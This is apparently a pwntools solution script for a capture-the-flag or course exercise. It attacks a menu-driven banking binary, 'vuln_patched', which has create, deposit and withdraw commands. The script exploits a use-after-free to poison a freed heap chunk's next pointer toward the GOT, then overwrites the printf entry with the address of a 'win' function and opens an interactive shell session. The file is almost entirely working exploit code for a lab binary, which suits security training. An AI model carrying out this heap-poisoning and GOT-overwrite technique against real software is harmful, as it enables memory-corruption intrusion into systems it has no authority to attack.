from pwn import *

context.binary = './vuln_patched'

addr = 0x403870 



win_addr = context.binary.symbols['win']

context.arch = "amd64"
context.terminal = ['kitty'] 


conn = process('./vuln_patched')
#conn = remote('tasks.ws24.softsec.rub.de', 32795) #process('./vuln_patched')
gdb.attach(conn)




def create(name: bytes) -> None:
    conn.sendlineafter(b'> ', b'1')
    conn.sendlineafter(b'?\n', name)

def deposit(name: bytes, amount) -> None:
    conn.sendlineafter(b'> ', b'2')
    conn.sendlineafter(b'into?\n', name)
    conn.sendlineafter(b'nt?\n', str(amount).encode())

def withdraw(name: bytes, amount) -> None:
    conn.sendlineafter(b'> ', b'3')
    conn.sendlineafter(b'from?\n', name)
    conn.sendlineafter(b'nt?\n', str(amount).encode())


# creates e->self->log for both A*8 and B*8
create(b'A'*8)
create(b'B'*8)

# frees e->self->log for both
withdraw(b'A'*8, '0')
withdraw(b'B'*8, '0')

# user after free in B*8 - overwriting next pointer to GOT
deposit(b'B'*8, 0x403870)

# create to malloc again - next alloc will then be on GOT
create(b'T'*8)
print(conn.recvline())

# this is now on the GOT
create(b'C'*8)
print(conn.recvline())
# write win into GOT entry for printf
deposit(b'C'*8, 0x401810)


# command:
# vis_heap_chunks


print(conn.recvline())
conn.interactive()





